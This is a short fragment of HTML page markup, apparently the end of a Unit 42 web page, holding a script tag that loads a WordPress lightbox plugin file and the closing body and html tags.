<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
